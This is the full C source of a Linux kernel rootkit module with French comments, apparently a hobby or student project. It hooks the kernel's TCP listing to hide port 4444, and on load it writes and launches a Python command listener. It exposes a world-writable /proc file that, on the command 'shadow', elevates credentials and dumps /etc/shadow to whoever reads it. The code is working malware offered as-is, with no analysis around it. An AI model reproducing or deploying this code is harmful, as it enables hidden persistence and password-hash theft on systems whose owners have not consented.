#include <linux/init.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/cred.h>
#include <linux/kernel.h>
#include <linux/namei.h>
#include <linux/seq_file.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/tcp.h>
#include <linux/kmod.h> // Pour call_usermodehelper
#include "ftrace_helper.h"

#define LISTENER_PATH "/tmp/listener.py"
#define LISTENER_CONTENT "#!/usr/bin/env python3\n" \
"import socket\n\n" \
"def handle_command(command):\n" \
"    if command == \"help\":\n" \
"        res = \"Available commands :\\nhelp\\nshadow\\nexit\"\n" \
"        return res\n" \
"    elif command == \"shadow\":\n" \
"        try:\n" \
"            with open(\"/proc/shadow_cmd\", \"w\") as proc_file:\n" \
"                proc_file.write(command)\n\n" \
"            with open(\"/proc/shadow_cmd\", \"r\") as proc_file:\n" \
"                return proc_file.read()\n" \
"        except Exception as e:\n" \
"            return f\"Error: {e}\"\n" \
"    else:\n" \
"        return \"Unknown command\"\n\n" \
"def start_server(host, port):\n" \
"    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:\n" \
"        server_socket.bind((host, port))\n" \
"        server_socket.listen(1)\n" \
"        print(f\"Server listening on {host}:{port}...\")\n" \
"        \n" \
"        while True:\n" \
"            client_socket, client_address = server_socket.accept()\n" \
"            with client_socket:\n" \
"                print(f\"Connection from {client_address}\")\n" \
"                data = client_socket.recv(2048).decode()\n" \
"                if not data:\n" \
"                    continue\n" \
"                \n" \
"                print(f\"Received: {data}\")\n" \
"                response = handle_command(data.strip())\n" \
"                \n" \
"                client_socket.sendall(response.encode())\n\n" \
"if __name__ == \"__main__\":\n" \
"    server_host = \"127.0.0.1\"\n" \
"    server_port = 4444\n" \
"    start_server(server_host, server_port)\n"

#define PROC_FILE "shadow_cmd" // Fichier tampon
#define BUFFER_SIZE 1048576 // 1Mio

MODULE_LICENSE("GPL");
MODULE_AUTHOR("drive6rdie");
MODULE_DESCRIPTION("My rootkit");
MODULE_VERSION("1.0");

static struct proc_dir_entry *proc_file;
static char *command_buffer;
static struct kprobe kp;
static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);

// Hook de tcp4 pour cacher le port ouvert
static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct inet_sock *is;
    long ret;
    unsigned short port = htons(4444);

    if (v != SEQ_START_TOKEN) {
		is = (struct inet_sock *)v;
		if (port == is->inet_sport || port == is->inet_dport) {
			printk(KERN_DEBUG "rootkit: sport: %d, dport: %d\n",
				   ntohs(is->inet_sport), ntohs(is->inet_dport));
			return 0;
		}
	}

	ret = orig_tcp4_seq_show(seq, v);
	return ret;
}

static struct ftrace_hook hooks[] = {
	HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
};

static ssize_t proc_read(struct file *file, char __user *buffer, size_t count, loff_t *pos) {
    static int finished = 0;
    struct file *shadow_file;
    char *shadow_data;
    ssize_t read_bytes;
    struct cred *old_cred;

    if (finished) {
        finished = 0;
        return 0;
    }
    finished = 1;

    if (strncmp(command_buffer, "shadow", 6) == 0) {
        // Allouer un buffer pour lire les données
        shadow_data = kzalloc(BUFFER_SIZE, GFP_KERNEL);
        if (!shadow_data) {
            printk(KERN_INFO "Memory allocation failed\n");
            return snprintf(command_buffer, BUFFER_SIZE, "Memory allocation failed\n");
        }

        old_cred = override_creds(prepare_kernel_cred(NULL));
        // Ouvrir le fichier /etc/shadow
        shadow_file = filp_open("/etc/shadow", O_RDONLY, 0);


        if (IS_ERR(shadow_file)) {
            printk(KERN_ERR "Failed to open /etc/shadow, error: %ld\n", PTR_ERR(shadow_file));
            revert_creds(old_cred); // Revenir aux creds initiaux
            kfree(shadow_data);
            return snprintf(command_buffer, BUFFER_SIZE, "Failed to open /etc/shadow\n");
        }
        revert_creds(old_cred); // Revenir aux creds initiaux après l'opération

        // Lire les données
        read_bytes = kernel_read(shadow_file, shadow_data, BUFFER_SIZE - 1, 0);
        filp_close(shadow_file, 0);

        if (read_bytes >= 0) {
            snprintf(command_buffer, BUFFER_SIZE, "%s\n", shadow_data);
            printk(KERN_INFO "Content of /etc/shadow:\n%s", shadow_data);
        } else {
            snprintf(command_buffer, BUFFER_SIZE, "Error reading /etc/shadow\n");
            printk(KERN_ERR "Error reading /etc/shadow\n");
        }

        kfree(shadow_data);
    } else {
        snprintf(command_buffer, BUFFER_SIZE, "Unknown command\n");
        printk(KERN_ERR "Unknown command\n");
    }

    return simple_read_from_buffer(buffer, count, pos, command_buffer, strlen(command_buffer));
}

static ssize_t proc_write(struct file *file, const char __user *buffer, size_t count, loff_t *pos) {
    if (count >= BUFFER_SIZE) {
        return -EINVAL;
    }
    if (copy_from_user(command_buffer, buffer, count)) {
        return -EFAULT;
    }
    command_buffer[count] = '\0';
    return count;
}

static const struct proc_ops proc_fops = {
    .proc_read = proc_read,
    .proc_write = proc_write,
};

static int execute_script(void) {
    char *argv[] = { "/usr/bin/python3", LISTENER_PATH, NULL };
    char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
    int ret;

    pr_info("Executing script: %s\n", LISTENER_PATH);
    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);

    if (ret < 0) {
        pr_err("Failed to execute script: %d\n", ret);
    } else {
        pr_info("Script executed successfully.\n");
    }

    return ret;
}

// Chargement du module
static int __init rootkit_init(void) {
    int err;
	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
	if(err)
		return err;


    //////////////CREATION DE FICHIER LISTENER/////////////////////
    struct file *file;
    ssize_t ret;

    pr_info("Module loaded, creating file %s\n", LISTENER_PATH);

    file = filp_open(LISTENER_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (IS_ERR(file)) {
        pr_err("Failed to open file %s\n", LISTENER_PATH);
        return PTR_ERR(file);
    }

    ret = kernel_write(file, LISTENER_CONTENT, strlen(LISTENER_CONTENT), &file->f_pos);
    if (ret < 0) {
        pr_err("Failed to write to file %s\n", LISTENER_PATH);
    } else {
        pr_info("File created and data written: %s\n", LISTENER_CONTENT);
    }

    filp_close(file, NULL);
    //////////////////////////////////////


    // Exécuter le script Python
    ret = execute_script();
    if (ret < 0) {
        pr_err("Failed to execute listener script.\n");
        return ret;
    }


    command_buffer = kzalloc(BUFFER_SIZE, GFP_KERNEL);
    if (!command_buffer) {
        return -ENOMEM;
    }

    proc_file = proc_create(PROC_FILE, 0666, NULL, &proc_fops);
    if (!proc_file) {
        kfree(command_buffer);
        return -ENOMEM;
    }
    pr_info("## Rootkit Loaded\n");
    return 0;
}

// Dechargement du module
static void __exit rootkit_exit(void) {
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    proc_remove(proc_file);
    kfree(command_buffer);
    pr_info("## Rootkit Unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
